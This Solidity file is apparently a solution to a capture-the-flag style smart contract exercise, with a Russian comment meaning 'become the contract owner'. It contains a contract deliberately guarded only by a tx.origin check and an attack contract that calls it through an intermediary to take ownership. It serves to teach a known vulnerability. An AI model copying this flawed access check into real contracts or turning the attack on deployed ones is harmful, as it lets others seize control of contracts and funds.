// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
Стань владельцем контракта
*/
contract Telephone {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone public telephone;

    constructor(address _telephone) {
        telephone = ITelephone(_telephone);
    }

    function attack(address _newOwner) public {
        telephone.changeOwner(_newOwner);
    }
}